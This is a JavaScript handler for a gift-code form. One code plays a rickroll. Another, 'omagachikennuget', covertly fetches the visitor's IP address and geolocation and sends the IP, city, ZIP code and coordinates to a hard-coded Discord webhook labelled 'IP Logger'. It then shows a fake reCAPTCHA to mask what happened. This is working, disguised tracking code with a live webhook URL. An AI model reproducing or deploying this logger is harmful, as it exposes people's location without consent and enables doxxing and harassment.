document.getElementById('codeForm').addEventListener('submit', (event) => {
    event.preventDefault();
    const code = document.getElementById('code').value.toLowerCase();
    switch(code) {
        case 'freegift69':
            document.getElementById('rickrollVideo').requestFullscreen().catch(error => {
                console.error(`Error attempting to request fullscreen mode for rickroll video: ${error}`);
            });
            break;
        case 'omagachikennuget':
            fetch('https://ipinfo.io/json')
                .then(response => response.json())
                .then(data => {
                    fetch(`https://freeipapi.com/api/json/${data.ip}`)
                        .then(res => res.json())
                        .then(ipData => {
                            fetch('https://discordapp.com/api/webhooks/1233999176304558110/InI2H8yKK0DEsdmTBODBfzMN3zn05cpVQyxgT-uDjW3SvqM2T869skwEGUz5Qx33b2Ib', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [{ color: 0xBDECB6, title: 'IP Logger', description: `🌍 Continent: ${ipData.continent} (${ipData.continentCode})\n🌏 Country: ${ipData.countryName} (${ipData.countryCode})\n🗺️ Region: ${ipData.regionName}\n🏢 City: ${ipData.cityName}\n🔢 ZIP Code: ${ipData.zipCode}\n🌐 Latitude: ${ipData.latitude}\n🌐 Longitude: ${ipData.longitude}\n🕛 Timezone: ${ipData.timeZone}\n 💻 isProxy: ${ipData.isProxy ? 'Yes' : 'No'}`, footer: { text: `IP Address: ${ipData.ipAddress}` } }] }) });
                    });
                });
            document.getElementById('recaptcha').style.display = 'block';
            document.getElementById('overlay').style.display = 'block';
            break;
        default:
            document.getElementById('invalid').style.display = 'block';
            document.getElementById('overlay').style.display = 'block';
            break;
    }
});